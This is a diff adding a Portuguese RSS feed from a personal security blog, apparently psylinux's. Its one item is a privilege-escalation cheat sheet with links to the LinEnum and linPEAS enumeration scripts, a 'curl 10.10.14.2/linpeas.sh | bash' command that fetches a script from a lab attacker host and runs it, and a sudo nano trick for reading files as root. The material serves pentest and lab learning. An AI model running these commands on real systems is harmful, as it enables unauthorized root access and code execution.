@@ -1,0 +1,47 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Priv-Escalation on Marcos Azevedo (aka psylinux)</title><link>https://psylinux.github.io/pt/tags/priv-escalation/</link><description>Recent content in Priv-Escalation on Marcos Azevedo (aka psylinux)</description><generator>Hugo</generator><language>pt-br</language><copyright>2025 Marcos Azevedo</copyright><lastBuildDate>Tue, 16 Jun 2020 17:38:15 -0300</lastBuildDate><atom:link href="https://psylinux.github.io/pt/tags/priv-escalation/index.xml" rel="self" type="application/rss+xml"/><item><title>Cheat Sheet :: Escalação de privilégios</title><link>https://psylinux.github.io/pt/cheatsheet/cheatsheet_privilege_escalation/</link><pubDate>Tue, 16 Jun 2020 17:38:15 -0300</pubDate><guid>https://psylinux.github.io/pt/cheatsheet/cheatsheet_privilege_escalation/</guid><description>&lt;h2 id="usando-scripts-para-enumerar-a-máquina">Usando scripts para enumerar a máquina&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/rebootuser/LinEnum&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Na máquina alvo podemos fazer:&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl 10.10.14.2/linpeas.sh | bash
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl 10.10.14.2/LinEnum.sh | bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="escalação-de-privilégio-com-nano">Escalação de privilégio com Nano&lt;/h2>
+&lt;ul>
+&lt;li>Isso pode ser usado para obter acesso root no servidor.&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>sudo -u root /bin/nano /opt/priv
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>O Nano permite inserir arquivos externos no arquivo atual usando o atalho.&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl+R
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>/pics/nano-001.png&lt;/p></description></item></channel></rss>
